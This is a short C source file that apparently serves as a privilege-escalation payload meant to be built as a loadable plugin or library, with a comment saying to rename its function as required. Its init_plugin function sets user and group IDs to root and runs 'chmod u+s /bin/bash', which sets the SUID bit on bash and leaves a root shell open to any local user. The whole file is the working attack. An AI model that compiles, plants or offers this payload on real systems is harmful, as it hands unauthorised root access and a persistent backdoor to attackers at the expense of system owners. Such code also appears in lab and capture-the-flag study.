#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int init_plugin(void){ // change the function name as required
    setuid(0); setgid(0);
    system("chmod u+s /bin/bash");
}

int main(void) {
    init_plugin();
    return 0;
}
